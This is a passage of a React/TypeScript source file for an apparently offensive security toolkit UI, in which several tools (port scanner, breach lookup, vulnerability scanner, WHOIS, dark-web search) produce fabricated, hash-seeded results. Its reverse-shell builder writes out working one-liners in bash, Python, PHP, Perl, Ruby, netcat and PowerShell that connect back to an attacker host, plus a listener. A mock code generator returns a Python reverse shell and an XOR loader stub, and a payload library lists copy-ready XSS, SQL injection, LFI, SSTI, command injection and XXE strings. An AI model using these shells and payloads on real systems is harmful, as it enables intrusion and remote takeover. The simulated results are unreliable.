      <div className="bg-background border border-border rounded-lg p-2.5 text-[13px] font-mono whitespace-pre-wrap break-all min-h-[80px]">
        {out}
      </div>
      <div className="flex justify-end">
        <CopyButton value={out} label="Copy result" />
      </div>
    </div>
  );
}

// ----- Helpers -----
function CopyButton({ value, label }: { value: string; label?: string }) {
  const [copied, setCopied] = useState(false);
  const { toast } = useToast();
  return (
    <button
      onClick={() => {
        navigator.clipboard.writeText(value);
        setCopied(true);
        toast({ description: "Copied to clipboard." });
        setTimeout(() => setCopied(false), 1500);
      }}
      className="p-2 text-muted-foreground hover:text-foreground rounded-lg hover:bg-accent inline-flex items-center gap-1.5 text-[11px]"
      aria-label={label ?? "Copy"}
    >
      {copied ? <Check className="w-4 h-4 text-emerald-400" /> : <Copy className="w-4 h-4" />}
      {label && <span>{label}</span>}
    </button>
  );
}

function hash32(s: string) {
  let h = 0;
  for (let i = 0; i < s.length; i++) h = (h * 31 + s.charCodeAt(i)) | 0;
  return h;
}

function FieldLabel({ children }: { children: React.ReactNode }) {
  return <div className="text-[11px] text-muted-foreground font-semibold uppercase tracking-wider mb-1.5">{children}</div>;
}

function ResultRow({ k, v }: { k: string; v: string }) {
  return (
    <div className="flex items-start justify-between text-[13px] gap-3">
      <span className="text-muted-foreground shrink-0">{k}</span>
      <span className="font-mono font-semibold text-right break-all">{v}</span>
    </div>
  );
}

const inputCls = "w-full bg-background border border-border rounded-xl px-3 py-2.5 outline-none focus:border-primary text-sm";
const inputMonoCls = inputCls + " font-mono";
const btnCls = "px-4 py-2.5 rounded-xl bg-primary text-white text-sm font-bold hover:opacity-90 disabled:opacity-50";

// ============ TOOLS ============

function PasswordGenerator() {
  const [length, setLength] = useState(20);
  const [lower, setLower] = useState(true);
  const [upper, setUpper] = useState(true);
  const [nums, setNums] = useState(true);
  const [syms, setSyms] = useState(true);
  const [pw, setPw] = useState("");

  const generate = () => {
    const sets: string[] = [];
    if (lower) sets.push("abcdefghijklmnopqrstuvwxyz");
    if (upper) sets.push("ABCDEFGHIJKLMNOPQRSTUVWXYZ");
    if (nums) sets.push("0123456789");
    if (syms) sets.push("!@#$%^&*()_-+=<>?[]{}");
    if (sets.length === 0) { setPw(""); return; }
    const all = sets.join("");
    let out = sets.map((s) => s[Math.floor(Math.random() * s.length)]).join("");
    while (out.length < length) out += all[Math.floor(Math.random() * all.length)];
    out = out.split("").sort(() => Math.random() - 0.5).join("");
    setPw(out.slice(0, length));
  };
  useEffect(generate, [length, lower, upper, nums, syms]);

  const strength = useMemo(() => {
    const variety = (lower ? 1 : 0) + (upper ? 1 : 0) + (nums ? 1 : 0) + (syms ? 1 : 0);
    const score = Math.min(100, Math.round((length / 32) * 60 + variety * 10));
    const label = score < 40 ? "Weak" : score < 70 ? "Strong" : "Vault grade";
    return { score, label };
  }, [length, lower, upper, nums, syms]);

  return (
    <div className="space-y-3">
      <div className="flex items-center gap-2 bg-background border border-border rounded-xl p-2">
        <code className="flex-1 font-mono text-[13px] truncate">{pw || "—"}</code>
        <button onClick={generate} className="p-2 text-muted-foreground hover:text-foreground rounded-lg hover:bg-accent" aria-label="Regenerate">
          <RefreshCw className="w-4 h-4" />
        </button>
        <CopyButton value={pw} />
      </div>
      <div>
        <div className="flex items-center justify-between text-[12px] text-muted-foreground mb-1">
          <span>Length</span><span className="font-mono">{length}</span>
        </div>
        <input type="range" min={8} max={64} value={length} onChange={(e) => setLength(Number(e.target.value))} className="w-full accent-[hsl(var(--primary))]" />
      </div>
      <div className="grid grid-cols-2 gap-2 text-sm">
        {[
          { label: "Lowercase a-z", v: lower, set: setLower },
          { label: "Uppercase A-Z", v: upper, set: setUpper },
          { label: "Numbers 0-9", v: nums, set: setNums },
          { label: "Symbols !@#", v: syms, set: setSyms },
        ].map((o) => (
          <label key={o.label} className="flex items-center justify-between bg-background border border-border rounded-lg px-3 py-2">
            <span>{o.label}</span><Switch checked={o.v} onCheckedChange={o.set} />
          </label>
        ))}
      </div>
      <div>
        <div className="flex items-center justify-between text-[12px] mb-1">
          <span className="text-muted-foreground">Strength</span><span className="font-semibold">{strength.label}</span>
        </div>
        <div className="h-1.5 bg-background rounded-full overflow-hidden">
          <div className="h-full transition-all" style={{ width: `${strength.score}%`, background: strength.score < 40 ? "#f59e0b" : strength.score < 70 ? "#10b981" : "hsl(var(--primary))" }} />
        </div>
      </div>
    </div>
  );
}

function EmailLookup() {
  const [email, setEmail] = useState("");
  const [result, setResult] = useState<null | { breaches: { name: string; date: string; records: string }[]; safe: boolean }>(null);
  const breachPool = [
    { name: "Adobe", date: "2013-10", records: "152M" },
    { name: "LinkedIn", date: "2012-05", records: "164M" },
    { name: "Dropbox", date: "2012-08", records: "68M" },
    { name: "MyFitnessPal", date: "2018-02", records: "144M" },
    { name: "Canva", date: "2019-05", records: "139M" },
    { name: "Twitter", date: "2022-12", records: "200M" },
  ];
  const search = () => {
    if (!email.includes("@")) return;
    const seed = Math.abs(hash32(email.toLowerCase()));
    const count = seed % 4;
    const breaches = Array.from({ length: count }, (_, i) => breachPool[(seed + i) % breachPool.length]);
    setResult({ breaches, safe: count === 0 });
  };
  return (
    <div className="space-y-3">
      <form onSubmit={(e) => { e.preventDefault(); search(); }} className="flex gap-2">
        <input type="email" required value={email} onChange={(e) => setEmail(e.target.value)} placeholder="user@domain.com" className={inputCls} />
        <button type="submit" className={btnCls}>Lookup</button>
      </form>
      {result && (
        <div className="rounded-xl border border-border bg-background p-3">
          {result.safe ? (
            <div className="flex items-center gap-2 text-emerald-400 text-sm font-semibold"><Check className="w-4 h-4" /> No known breaches.</div>
          ) : (
            <>
              <div className="text-[12px] text-amber-400 font-semibold mb-2">Found in {result.breaches.length} breach(es):</div>
              <div className="space-y-1.5">
                {result.breaches.map((b, i) => (
                  <div key={i} className="flex items-center justify-between text-[13px]">
                    <span className="font-semibold">{b.name}</span>
                    <span className="text-muted-foreground font-mono text-[11px]">{b.date} · {b.records}</span>
                  </div>
                ))}
              </div>
            </>
          )}
        </div>
      )}
    </div>
  );
}

function IpScanner() {
  const [target, setTarget] = useState("");
  const [lines, setLines] = useState<string[]>([]);
  const [running, setRunning] = useState(false);
  const run = () => {
    if (!target.trim()) return;
    setLines([]); setRunning(true);
    const seed = Math.abs(hash32(target));
    const ports = [
      { p: 22, svc: "ssh", banner: "OpenSSH 9.3p1" },
      { p: 80, svc: "http", banner: "nginx 1.25.4" },
      { p: 443, svc: "ssl/http", banner: "nginx 1.25.4" },
      { p: 3306, svc: "mysql", banner: "MySQL 8.0.36" },
      { p: 5432, svc: "postgres", banner: "PostgreSQL 16.1" },
      { p: 6379, svc: "redis", banner: "Redis 7.2" },
      { p: 8080, svc: "http-proxy", banner: "Apache 2.4.58" },
    ];
    const open = ports.filter((_, i) => ((seed >> i) & 1) === 1).slice(0, 5);
    if (open.length === 0) open.push(ports[0], ports[1]);
    const log = [
      `$ nmap -sS -sV -T4 ${target}`,
      `Starting Nmap 7.94 ( https://nmap.org )`,
      `Nmap scan report for ${target}`,
      `Host is up (0.0${(seed % 90) + 10}s latency).`,
      ...open.map((o) => `${String(o.p).padEnd(7, " ")}/tcp open  ${o.svc.padEnd(10, " ")}${o.banner}`),
      `Service detection performed.`,
      `Nmap done: 1 IP address (1 host up) scanned in ${(2 + (seed % 50) / 10).toFixed(2)}s`,
    ];
    let i = 0;
    const t = setInterval(() => {
      setLines((prev) => [...prev, log[i]]);
      i++;
      if (i >= log.length) { clearInterval(t); setRunning(false); }
    }, 180);
  };
  return (
    <div className="space-y-3">
      <form onSubmit={(e) => { e.preventDefault(); run(); }} className="flex gap-2">
        <input value={target} onChange={(e) => setTarget(e.target.value)} placeholder="acme.example or 10.10.10.5" className={inputMonoCls} />
        <button type="submit" disabled={running} className={btnCls}>{running ? "Scanning..." : "Scan"}</button>
      </form>
      <pre className="rounded-xl bg-[#050505] border border-border p-3 font-mono text-[12px] leading-relaxed h-56 overflow-y-auto whitespace-pre">
        {lines.length === 0 && !running ? "Waiting for target..." : lines.join("\n")}
        {running && <span className="inline-block w-2 h-3 bg-primary animate-pulse align-middle ml-1" />}
      </pre>
    </div>
  );
}

function HashCracker() {
  const [hash, setHash] = useState("");
  const [result, setResult] = useState<null | { type: string; cracked: string | null }>(null);
  const dict: Record<string, string> = {
    "5d41402abc4b2a76b9719d911017c592": "hello",
    "5f4dcc3b5aa765d61d8327deb882cf99": "password",
    "e10adc3949ba59abbe56e057f20f883e": "123456",
    "21232f297a57a5a743894a0e4a801fc3": "admin",
    "098f6bcd4621d373cade4e832627b4f6": "test",
    "8cb2237d0679ca88db6464eac60da96345513964": "12345678",
  };
  const detect = (h: string) => {
    const t = h.trim().toLowerCase();
    if (/^[a-f0-9]{32}$/.test(t)) return "MD5";
    if (/^[a-f0-9]{40}$/.test(t)) return "SHA-1";
    if (/^[a-f0-9]{64}$/.test(t)) return "SHA-256";
    if (/^[a-f0-9]{128}$/.test(t)) return "SHA-512";
    if (/^\$2[aby]\$/.test(t)) return "bcrypt";
    return "Unknown";
  };
  const crack = () => {
    const t = hash.trim().toLowerCase();
    setResult({ type: detect(t), cracked: dict[t] ?? null });
  };
  return (
    <div className="space-y-3">
      <form onSubmit={(e) => { e.preventDefault(); crack(); }} className="space-y-2">
        <textarea value={hash} onChange={(e) => setHash(e.target.value)} placeholder="Paste an MD5, SHA-1, SHA-256, SHA-512 or bcrypt hash..." rows={2} className={inputMonoCls + " text-[12px] resize-none"} />
        <button type="submit" className={btnCls + " w-full"}>Crack</button>
      </form>
      {result && (
        <div className="rounded-xl border border-border bg-background p-3 space-y-2">
          <ResultRow k="Detected type" v={result.type} />
          <ResultRow k="Plaintext" v={result.cracked ?? "Not in dictionary"} />
        </div>
      )}
    </div>
  );
}

function VulnScanner() {
  const [target, setTarget] = useState("");
  const [findings, setFindings] = useState<{ id: string; sev: string; title: string; desc: string }[] | null>(null);
  const [running, setRunning] = useState(false);
  const POOL = [
    { id: "CVE-2024-3094", sev: "Critical", title: "xz-utils backdoor", desc: "Malicious code in liblzma may allow auth bypass on sshd." },
    { id: "CVE-2023-44487", sev: "High", title: "HTTP/2 Rapid Reset", desc: "DoS via stream reset flood." },
    { id: "CVE-2021-44228", sev: "Critical", title: "Log4Shell", desc: "RCE via JNDI lookup in log4j 2.x." },
    { id: "CVE-2022-22965", sev: "Critical", title: "Spring4Shell", desc: "RCE in Spring Core via data binding." },
    { id: "MISC-001", sev: "Medium", title: "TLS 1.0 enabled", desc: "Legacy TLS exposes downgrade attacks." },
    { id: "MISC-002", sev: "Low", title: "Server header leaks version", desc: "Reveals software stack to attackers." },
    { id: "MISC-003", sev: "Medium", title: "Missing HSTS", desc: "No Strict-Transport-Security header set." },
  ];
  const run = () => {
    if (!target.trim()) return;
    setRunning(true); setFindings(null);
    setTimeout(() => {
      const seed = Math.abs(hash32(target));
      const out = POOL.filter((_, i) => ((seed >> i) & 1) === 1).slice(0, 5);
      setFindings(out.length === 0 ? [POOL[5]] : out);
      setRunning(false);
    }, 900);
  };
  const sevColor: Record<string, string> = {
    Critical: "bg-primary/15 text-primary border-primary/30",
    High: "bg-amber-500/15 text-amber-400 border-amber-500/30",
    Medium: "bg-yellow-500/15 text-yellow-400 border-yellow-500/30",
    Low: "bg-blue-500/15 text-blue-400 border-blue-500/30",
  };
  return (
    <div className="space-y-3">
      <form onSubmit={(e) => { e.preventDefault(); run(); }} className="flex gap-2">
        <input value={target} onChange={(e) => setTarget(e.target.value)} placeholder="https://target.example" className={inputMonoCls} />
        <button type="submit" disabled={running} className={btnCls}>{running ? "Scanning..." : "Scan"}</button>
      </form>
      <div className="space-y-2 max-h-72 overflow-y-auto">
        {!findings && !running && <div className="text-[12px] text-muted-foreground italic">Enter a target to begin scanning.</div>}
        {running && <div className="text-[12px] text-muted-foreground">Probing target services and CVEs...</div>}
        {findings?.map((f) => (
          <div key={f.id} className="rounded-xl border border-border bg-background p-3">
            <div className="flex items-center justify-between mb-1">
              <span className="font-mono text-[12px] text-muted-foreground">{f.id}</span>
              <span className={`text-[10px] font-bold uppercase px-2 py-0.5 rounded-full border ${sevColor[f.sev]}`}>{f.sev}</span>
            </div>
            <div className="font-semibold text-sm">{f.title}</div>
            <div className="text-[12px] text-muted-foreground mt-0.5">{f.desc}</div>
          </div>
        ))}
      </div>
    </div>
  );
}

function AgentIde() {
  const [task, setTask] = useState("Reverse shell in Python over TCP");
  const [out, setOut] = useState("");
  const [busy, setBusy] = useState(false);
  const samples: Record<string, string> = {
    reverse: `import socket, subprocess, os\n\nHOST = "10.10.14.5"\nPORT = 4444\n\ns = socket.socket()\ns.connect((HOST, PORT))\n[os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]\nsubprocess.call(["/bin/sh", "-i"])`,
    xor: `// XOR loader stub\n#include <stdio.h>\n#include <string.h>\nvoid xor_buf(unsigned char *b, size_t n, unsigned char k){\n  for (size_t i=0;i<n;i++) b[i]^=k;\n}\nint main(int argc,char**argv){\n  unsigned char payload[]={0x10,0x22,0x33,0x44};\n  xor_buf(payload,sizeof(payload),0x55);\n  /* execute payload */\n  return 0;\n}`,
    sql: `-- Time-based blind SQLi probe\nSELECT * FROM users\n WHERE id = 1\n   AND IF(SUBSTRING(@@version,1,1)='8',SLEEP(3),0);`,
  };
  const run = () => {
    setBusy(true); setOut("");
    setTimeout(() => {
      const t = task.toLowerCase();
      const code = t.includes("xor") || t.includes("loader") ? samples.xor : t.includes("sql") || t.includes("inject") ? samples.sql : samples.reverse;
      setOut(code); setBusy(false);
    }, 600);
  };
  return (
    <div className="space-y-3">
      <div className="flex gap-2">
        <input value={task} onChange={(e) => setTask(e.target.value)} placeholder="Describe the snippet you need" className={inputCls} />
        <button onClick={run} disabled={busy} className={btnCls}>{busy ? "..." : "Generate"}</button>
      </div>
      <div className="rounded-xl bg-[#050505] border border-border overflow-hidden">
        <div className="flex items-center justify-between px-3 py-1.5 border-b border-border text-[11px] uppercase tracking-wider text-muted-foreground">
          <span>generated.snippet</span>
          {out && <CopyButton value={out} />}
        </div>
        <pre className="p-3 text-[12px] font-mono leading-relaxed h-56 overflow-auto whitespace-pre">{out || "// Output will appear here"}</pre>
      </div>
    </div>
  );
}

function DarkWebSearch() {
  const [q, setQ] = useState("");
  const [hits, setHits] = useState<{ title: string; onion: string; snippet: string }[] | null>(null);
  const POOL = [
    { title: "DumpForum Index", onion: "dumpforumxyz3a4b.onion", snippet: "Latest leaked credentials from 2025 breaches." },
    { title: "Marketplace Mirror", onion: "marketmirror77kqz.onion", snippet: "Mirror of common dark marketplaces, hourly updates." },
    { title: "PasteVault Archive", onion: "pastevault4klm2.onion", snippet: "Indexed pastes from public and underground sources." },
    { title: "DataHoard Search", onion: "datahoardv2lz3.onion", snippet: "Search across 14B leaked records." },
    { title: "ShadowBoard", onion: "shadowboardpqrx.onion", snippet: "Threads on recent operations and tradecraft." },
  ];
  const run = () => {
    if (!q.trim()) return;
    const seed = Math.abs(hash32(q));
    setHits(POOL.filter((_, i) => ((seed >> i) & 1) === 1).slice(0, 4).concat(POOL[0]).slice(0, 4));
  };
  return (
    <div className="space-y-3">
      <form onSubmit={(e) => { e.preventDefault(); run(); }} className="flex gap-2">
        <input value={q} onChange={(e) => setQ(e.target.value)} placeholder="Search leaked data, .onion, marketplaces..." className={inputCls} />
        <button type="submit" className={btnCls}>Search</button>
      </form>
      <div className="space-y-2 max-h-72 overflow-y-auto">
        {!hits && <div className="text-[12px] text-muted-foreground italic">Type a query to search.</div>}
        {hits?.map((h, i) => (
          <div key={i} className="rounded-xl border border-border bg-background p-3">
            <div className="font-semibold text-sm">{h.title}</div>
            <div className="font-mono text-[11px] text-purple-400 mt-0.5">{h.onion}</div>
            <div className="text-[12px] text-muted-foreground mt-1">{h.snippet}</div>
          </div>
        ))}
      </div>
    </div>
  );
}

function WhoisLookup() {
  const [domain, setDomain] = useState("");
  const [data, setData] = useState<Record<string, string> | null>(null);
  const REGISTRARS = ["GoDaddy.com, LLC", "Namecheap, Inc.", "Cloudflare, Inc.", "Google Domains LLC", "Tucows Domains Inc."];
  const COUNTRIES = ["United States", "Germany", "Netherlands", "Japan", "Canada", "United Kingdom"];
  const lookup = () => {
    if (!domain.trim()) return;
    const seed = Math.abs(hash32(domain));
    const created = new Date(Date.now() - (seed % 5000) * 86400000);
    const expires = new Date(created.getTime() + (365 + (seed % 365)) * 86400000);
    setData({
      Domain: domain,
      Registrar: REGISTRARS[seed % REGISTRARS.length],
      Created: created.toISOString().slice(0, 10),
      Expires: expires.toISOString().slice(0, 10),
      "Name Server 1": `ns1.${domain.replace(/^.*\./, "")}provider.net`,
      "Name Server 2": `ns2.${domain.replace(/^.*\./, "")}provider.net`,
      Country: COUNTRIES[seed % COUNTRIES.length],
      DNSSEC: seed % 2 === 0 ? "signed" : "unsigned",
      Status: "clientTransferProhibited",
    });
  };
  return (
    <div className="space-y-3">
      <form onSubmit={(e) => { e.preventDefault(); lookup(); }} className="flex gap-2">
        <input value={domain} onChange={(e) => setDomain(e.target.value)} placeholder="example.com" className={inputMonoCls} />
        <button type="submit" className={btnCls}>Lookup</button>
      </form>
      {data && (
        <div className="rounded-xl border border-border bg-background p-3 space-y-1.5">
          {Object.entries(data).map(([k, v]) => <ResultRow key={k} k={k} v={v} />)}
        </div>
      )}
    </div>
  );
}

function DnsLookup() {
  const [domain, setDomain] = useState("");
  const [type, setType] = useState<"A" | "AAAA" | "MX" | "TXT" | "NS" | "CNAME">("A");
  const [records, setRecords] = useState<string[] | null>(null);
  const lookup = () => {
    if (!domain.trim()) return;
    const seed = Math.abs(hash32(domain + type));
    const out: string[] = [];
    if (type === "A") {
      out.push(`${(seed % 223) + 1}.${(seed >> 4) % 256}.${(seed >> 8) % 256}.${(seed >> 12) % 256}`);
      out.push(`${(seed % 223) + 1}.${(seed >> 5) % 256}.${(seed >> 9) % 256}.${(seed >> 13) % 256}`);
    } else if (type === "AAAA") {
      out.push(`2606:4700::${(seed % 9999).toString(16)}:${(seed >> 4 & 0xffff).toString(16)}`);
    } else if (type === "MX") {
      out.push(`10 mail.${domain}`); out.push(`20 mail2.${domain}`); out.push(`30 backup.${domain}`);
    } else if (type === "TXT") {
      out.push(`"v=spf1 include:_spf.${domain} ~all"`);
      out.push(`"google-site-verification=${(seed * 31).toString(36).slice(0, 22)}"`);
    } else if (type === "NS") {
      out.push(`ns1.cloudflare.com`); out.push(`ns2.cloudflare.com`);
    } else {
      out.push(`www.${domain} -> ${domain}.cdn.example.net`);
    }
    setRecords(out);
  };
  return (
    <div className="space-y-3">
      <form onSubmit={(e) => { e.preventDefault(); lookup(); }} className="flex gap-2">
        <input value={domain} onChange={(e) => setDomain(e.target.value)} placeholder="example.com" className={inputMonoCls + " flex-1"} />
        <select value={type} onChange={(e) => setType(e.target.value as typeof type)} className="bg-background border border-border rounded-xl px-2 text-sm">
          {(["A", "AAAA", "MX", "TXT", "NS", "CNAME"] as const).map((t) => <option key={t}>{t}</option>)}
        </select>
        <button type="submit" className={btnCls}>Query</button>
      </form>
      {records && (
        <div className="rounded-xl border border-border bg-background p-3 space-y-1">
          {records.map((r, i) => <div key={i} className="font-mono text-[12px] break-all">{r}</div>)}
        </div>
      )}
    </div>
  );
}

function SubdomainFinder() {
  const [domain, setDomain] = useState("");
  const [subs, setSubs] = useState<{ name: string; ip: string; status: string }[] | null>(null);
  const [running, setRunning] = useState(false);
  const PREFIXES = ["www", "api", "admin", "mail", "dev", "staging", "test", "vpn", "git", "blog", "shop", "cdn", "files", "auth", "internal"];
  const run = () => {
    if (!domain.trim()) return;
    setRunning(true); setSubs(null);
    setTimeout(() => {
      const seed = Math.abs(hash32(domain));
      const out = PREFIXES.filter((_, i) => ((seed >> i) & 1) === 1).slice(0, 8).map((p, i) => ({
        name: `${p}.${domain}`,
        ip: `${(seed % 223) + 1}.${(seed >> 4 + i) % 256}.${(seed >> 8 + i) % 256}.${(seed >> 12 + i) % 256}`,
        status: i % 4 === 0 ? "200 OK" : i % 4 === 1 ? "403 Forbidden" : i % 4 === 2 ? "301 Redirect" : "200 OK",
      }));
      setSubs(out.length === 0 ? [{ name: `www.${domain}`, ip: "1.1.1.1", status: "200 OK" }] : out);
      setRunning(false);
    }, 1100);
  };
  return (
    <div className="space-y-3">
      <form onSubmit={(e) => { e.preventDefault(); run(); }} className="flex gap-2">
        <input value={domain} onChange={(e) => setDomain(e.target.value)} placeholder="example.com" className={inputMonoCls} />
        <button type="submit" disabled={running} className={btnCls}>{running ? "Enumerating..." : "Find"}</button>
      </form>
      {subs && (
        <div className="space-y-1.5 max-h-64 overflow-y-auto">
          {subs.map((s) => (
            <div key={s.name} className="rounded-lg border border-border bg-background p-2 flex items-center justify-between text-[12px]">
              <span className="font-mono font-semibold">{s.name}</span>
              <div className="flex items-center gap-2">
                <span className="font-mono text-muted-foreground">{s.ip}</span>
                <span className={`text-[10px] font-bold px-2 py-0.5 rounded ${s.status.startsWith("2") ? "bg-emerald-500/15 text-emerald-400" : s.status.startsWith("4") ? "bg-amber-500/15 text-amber-400" : "bg-blue-500/15 text-blue-400"}`}>{s.status}</span>
              </div>
            </div>
          ))}
        </div>
      )}
    </div>
  );
}

function SslChecker() {
  const [host, setHost] = useState("");
  const [data, setData] = useState<Record<string, string> | null>(null);
  const ISSUERS = ["Let's Encrypt R3", "DigiCert TLS RSA SHA256 2020 CA1", "Cloudflare Inc ECC CA-3", "Sectigo RSA Domain Validation"];
  const check = () => {
    if (!host.trim()) return;
    const seed = Math.abs(hash32(host));
    const issued = new Date(Date.now() - (seed % 80) * 86400000);
    const expires = new Date(issued.getTime() + 90 * 86400000);
    const days = Math.round((expires.getTime() - Date.now()) / 86400000);
    setData({
      Host: host,
      Issuer: ISSUERS[seed % ISSUERS.length],
      "Subject CN": host,
      "Valid from": issued.toISOString().slice(0, 10),
      "Valid until": expires.toISOString().slice(0, 10),
      "Days remaining": String(days),
      "Signature algo": "SHA256-RSA",
      "Key size": "2048 bit",
      "TLS 1.3": "supported",
      "TLS 1.2": "supported",
      "TLS 1.0": seed % 3 === 0 ? "ENABLED (unsafe)" : "disabled",
      HSTS: seed % 2 === 0 ? "enabled (1y)" : "missing",
    });
  };
  return (
    <div className="space-y-3">
      <form onSubmit={(e) => { e.preventDefault(); check(); }} className="flex gap-2">
        <input value={host} onChange={(e) => setHost(e.target.value)} placeholder="example.com" className={inputMonoCls} />
        <button type="submit" className={btnCls}>Check</button>
      </form>
      {data && (
        <div className="rounded-xl border border-border bg-background p-3 space-y-1.5">
          {Object.entries(data).map(([k, v]) => <ResultRow key={k} k={k} v={v} />)}
        </div>
      )}
    </div>
  );
}

function HttpHeaders() {
  const [url, setUrl] = useState("");
  const [headers, setHeaders] = useState<{ k: string; v: string; status: "good" | "warn" | "bad" }[] | null>(null);
  const check = () => {
    if (!url.trim()) return;
    const seed = Math.abs(hash32(url));
    const has = (n: number) => ((seed >> n) & 1) === 1;
    setHeaders([
      { k: "Server", v: has(0) ? "nginx 1.25.4" : "cloudflare", status: has(0) ? "warn" : "good" },
      { k: "Strict-Transport-Security", v: has(1) ? "max-age=31536000; includeSubDomains" : "(missing)", status: has(1) ? "good" : "bad" },
      { k: "Content-Security-Policy", v: has(2) ? "default-src 'self'" : "(missing)", status: has(2) ? "good" : "bad" },
      { k: "X-Frame-Options", v: has(3) ? "DENY" : "(missing)", status: has(3) ? "good" : "warn" },
      { k: "X-Content-Type-Options", v: has(4) ? "nosniff" : "(missing)", status: has(4) ? "good" : "warn" },
      { k: "Referrer-Policy", v: has(5) ? "strict-origin-when-cross-origin" : "(missing)", status: has(5) ? "good" : "warn" },
      { k: "Permissions-Policy", v: has(6) ? "geolocation=(), microphone=()" : "(missing)", status: has(6) ? "good" : "warn" },
      { k: "Set-Cookie", v: has(7) ? "session=...; Secure; HttpOnly; SameSite=Lax" : "(no cookies)", status: has(7) ? "good" : "warn" },
    ]);
  };
  const dot = (s: string) => s === "good" ? "bg-emerald-400" : s === "warn" ? "bg-amber-400" : "bg-primary";
  return (
    <div className="space-y-3">
      <form onSubmit={(e) => { e.preventDefault(); check(); }} className="flex gap-2">
        <input value={url} onChange={(e) => setUrl(e.target.value)} placeholder="https://example.com" className={inputMonoCls} />
        <button type="submit" className={btnCls}>Audit</button>
      </form>
      {headers && (
        <div className="space-y-1.5 max-h-64 overflow-y-auto">
          {headers.map((h) => (
            <div key={h.k} className="rounded-lg border border-border bg-background p-2 text-[12px]">
              <div className="flex items-center gap-2 mb-0.5">
                <span className={`w-2 h-2 rounded-full ${dot(h.status)}`} />
                <span className="font-semibold">{h.k}</span>
              </div>
              <div className="font-mono text-muted-foreground break-all pl-4">{h.v}</div>
            </div>
          ))}
        </div>
      )}
    </div>
  );
}

function ReverseShellBuilder() {
  const [host, setHost] = useState("10.10.14.5");
  const [port, setPort] = useState(4444);
  const [lang, setLang] = useState("bash");
  const TEMPLATES: Record<string, (h: string, p: number) => string> = {
    bash: (h, p) => `bash -i >& /dev/tcp/${h}/${p} 0>&1`,
    "bash (alt)": (h, p) => `0<&196;exec 196<>/dev/tcp/${h}/${p}; sh <&196 >&196 2>&196`,
    python: (h, p) => `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${h}",${p}));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh","-i"])'`,
    php: (h, p) => `php -r '$s=fsockopen("${h}",${p});exec("/bin/sh -i <&3 >&3 2>&3");'`,
    perl: (h, p) => `perl -e 'use Socket;$i="${h}";$p=${p};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
    ruby: (h, p) => `ruby -rsocket -e 'exit if fork;c=TCPSocket.new("${h}",${p});while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`,
    nc: (h, p) => `nc -e /bin/sh ${h} ${p}`,
    "nc (mkfifo)": (h, p) => `rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${h} ${p} >/tmp/f`,
    powershell: (h, p) => `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${h}',${p});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
  };
  const out = TEMPLATES[lang](host, port);
  const listener = `# On attacker:\nnc -lvnp ${port}`;
  return (
    <div className="space-y-3">
      <div className="grid grid-cols-3 gap-2">
        <input value={host} onChange={(e) => setHost(e.target.value)} placeholder="LHOST" className={inputMonoCls + " col-span-1"} />
        <input value={port} onChange={(e) => setPort(Number(e.target.value) || 4444)} type="number" placeholder="LPORT" className={inputMonoCls + " col-span-1"} />
        <select value={lang} onChange={(e) => setLang(e.target.value)} className="bg-background border border-border rounded-xl px-2 text-sm font-mono col-span-1">
          {Object.keys(TEMPLATES).map((l) => <option key={l}>{l}</option>)}
        </select>
      </div>
      <div className="rounded-xl bg-[#050505] border border-border overflow-hidden">
        <div className="flex items-center justify-between px-3 py-1.5 border-b border-border text-[11px] uppercase tracking-wider text-muted-foreground">
          <span>{lang} payload</span><CopyButton value={out} />
        </div>
        <pre className="p-3 text-[12px] font-mono leading-relaxed overflow-x-auto whitespace-pre-wrap break-all">{out}</pre>
      </div>
      <div className="rounded-xl bg-[#050505] border border-border overflow-hidden">
        <div className="flex items-center justify-between px-3 py-1.5 border-b border-border text-[11px] uppercase tracking-wider text-muted-foreground">
          <span>listener</span><CopyButton value={listener} />
        </div>
        <pre className="p-3 text-[12px] font-mono leading-relaxed">{listener}</pre>
      </div>
    </div>
  );
}

function PayloadLibrary() {
  const CATS: Record<string, string[]> = {
    XSS: [
      `<script>alert(document.domain)</script>`,
      `"><img src=x onerror=alert(1)>`,
      `<svg/onload=alert(1)>`,
      `javascript:alert(document.cookie)`,
      `<iframe src="javascript:alert(\`xss\`)">`,
    ],
    SQLi: [
      `' OR 1=1--`,
      `' UNION SELECT NULL,version(),NULL--`,
      `' AND SLEEP(5)--`,
      `admin'--`,
      `'; EXEC xp_cmdshell('whoami')--`,
    ],
    LFI: [`../../../../etc/passwd`, `....//....//etc/passwd`, `php://filter/convert.base64-encode/resource=index.php`, `/proc/self/environ`, `expect://id`],
    SSTI: [`{{7*7}}`, `${"${7*7}"}`, `<%= 7*7 %>`, `{{config.items()}}`, `{{''.__class__.__mro__[2].__subclasses__()}}`],
    "Command Inj": [`; id`, `| whoami`, `\`id\``, `$(id)`, `&& cat /etc/passwd`],
    XXE: [`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`],
  };
  const [cat, setCat] = useState<string>("XSS");
  return (
    <div className="space-y-3">
      <div className="flex gap-1.5 flex-wrap">
        {Object.keys(CATS).map((c) => (
          <button key={c} onClick={() => setCat(c)} className={`px-3 py-1.5 rounded-full text-[12px] font-semibold border ${cat === c ? "bg-primary text-white border-primary" : "bg-background border-border text-muted-foreground hover:text-foreground"}`}>{c}</button>
        ))}
      </div>
      <div className="space-y-1.5 max-h-72 overflow-y-auto">
        {CATS[cat].map((p, i) => (
          <div key={i} className="rounded-lg border border-border bg-background p-2 flex items-start gap-2">
            <code className="flex-1 font-mono text-[12px] break-all">{p}</code>
            <CopyButton value={p} />
          </div>
        ))}
      </div>
